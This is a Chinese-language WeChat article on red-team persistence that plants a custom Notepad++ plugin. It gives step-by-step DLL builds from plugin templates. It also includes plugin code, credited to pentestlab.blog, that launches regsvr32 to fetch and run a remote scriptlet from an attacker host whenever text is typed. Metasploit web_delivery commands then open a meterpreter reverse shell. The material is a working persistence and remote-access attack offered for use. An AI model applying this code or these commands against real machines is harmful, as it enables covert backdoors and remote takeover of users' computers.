#  黑客(红队)攻防中利用Notepade++实现权限维持

原创 Flowers aq [ flower安全混子 ](javascript:void\(0\);)

**flower安全混子** ![]()

微信号 flowerx258

功能介绍 一定要离梦想近一点.

____

___发表于_

收录于合集

#红蓝对抗 4 个

#红队 3 个

#权限维持 1 个

前言：已开通交流群可在公众号精选文章进入。

前几天在sechub平台拿到了一个课题

![]()

但是这段时间有点忙所以就没写，等开始写的时候已经过期了，今天就补一篇哈哈 **  
**

 **Notepade++：  
**

![]()

 **  
**

    Notepade++是一款Windows中的免费文本编辑器，其功能非常强大，即可以编辑普通文本内容当作记事本，还可以编辑类似python，Html，C等等的代码所以是很多普通用户，开发者和安全爱好者电脑必不可少的一款工具也是花某平常使用最频繁的一款编辑器 **。  
**

 **自定义插件：  
**

 ** **
而花某最喜欢的就是它的自定义插件功能，可以自己添加非常多的插件用于扩展功能，最重要的是可以不用去官方商城下载官方插件可以使用自己开发的插件，所以就可以利用它实现命令执行和运行脚本等目的。  

 **实操：  
**

  项目1：

  * 

    
    
    https://github.com/npp-plugins/plugintemplate

此项目为不会插件开发的准备了一个模板只需要修改些许代码即可实现自己的测试功能。  

![]()

![]()

  * 

    
    
    https://github.com/npp-plugins/plugintemplate/releases/download/v4.3/pluginTemplate.v4.3.bin.arm64.zip

也可直接下载这个，下载完成后先用VS studio打开"\plugintemplate-master\src\PluginDefinition.h"文件

![]()

31行位置const TCHAR NPP_PLUGIN_NAME的TEXT可以随意起个名字

![]()

![]()

这里的值不能为0，项目存在两个测试内容，改完配置内容再打开"plugintemplate-
master\src\PluginDefinition.cpp"文件  

![]()

添加弹窗测试代码：

  *   *   *   *   * 

    
    
    void pluginInit(HANDLE /*hModule*/){    MessageBox(NULL, TEXT(""), TEXT("test"), NULL);}  
    

然后生成Dll  

![]()

![]()

![]()

随后创建文件夹叫：“rt test” **  
**

![]()

把生成的dll拖进去

![]()

然后找到notepade++的plugins文件夹路径是C:\Notepad++\plugins注：notepade++插件的文件名夹名和dll文件名得是同一个。  

做完这些后我们可以新建一个文本文档去查看效果。

![]()

输入字符成功弹窗。

项目2：

  * 

    
    
    https://github.com/kbilste/NotepadPlusPlusPluginPack.Net

此开发项目对于前面的项目来说开放性更大，对于前者来说它提供的只有2种测试方案，而此开发项目给出开发模板的同时可以在模板内开发出更多的测试代码从而去实现权限维持目的。

![]()

![]()

项目底部也有说明

首先下载项目源码：

![]()

在VS studio选择新建项目：  

![]()

选择类库

![]()

因为项目是C#的所以选择创建C#类库项目

![]()

项目名称输入“rt rest2”

![]()

框架选择要4.5往上要不然错误一堆，创建完毕后点击打开文件

![]()

打开Visual Studio Project Template C#文件下的Main.cs文件  

![]()

![]()

这里的OnNotification部分是供大家自定义的

![]()

测试代码：

  *   *   *   *   *   *   *   *   *   *   * 

    
    
    class Main{    static bool ExecuteOnce = true;    public static void OnNotification(ScNotification notification)    {        if (notification.Header.Code == (uint)SciMsg.SCI_ADDTEXT && ExecuteOnce)        {            MessageBox.Show("rt test2");            ExecuteOnce = !ExecuteOnce;        }    }

   首先在 class Malin下添加上面的static bool ExecuteOnce = true；代码

![]()

然后在自定义部分粘贴其余代码：

![]()

编译生成Dll文件

![]()

和上步同样创建rt test2文件夹拖入生成的dll

![]()

再放到Notepade++的plugins文件夹下创建rt test2.txt文本进行测试

![]()

![]()

成功弹窗。

 **反弹shell：**

pentestlab.blog公开的测试代码：

  *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    class   Main     {    static   bool   firstRun =  true ;         public   static   void   OnNotification(ScNotification notification)         {             if   (notification.Header.Code == ( uint )SciMsg.SCI_ADDTEXT && firstRun)             {                 string   strCmdText;                 strCmdText =  "/s /n /u /i: http://10.0.0.3:8080/nHIcvfz6N.sct  scrobj.dll" ;                 Process.Start( "regsvr32" , strCmdText);                 firstRun = !firstRun;                 }             }

使用regsvr32命令来注册一个DLL文件，大家可以根据自己的情况去更改  

![]()

MSF：

  *   *   *   *   *   * 

    
    
    use exploit/multi/script/web_deliveryset target 2set payload windows/x64/meterpreter/reverse_tcpset LHOST xxxset LPORT xxxrun

![]()

![]()

 **然后直接用` sessions管理连接进行操作即可。  
`**

`总结：` **`  
`**

 **` `**` 总体来说，Notepade进行权限维持也还是存在局限性的且对于完全没接触过开发的人来说上手难度也还是有的。` **`  
`**

 **`  
`**

  

  

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

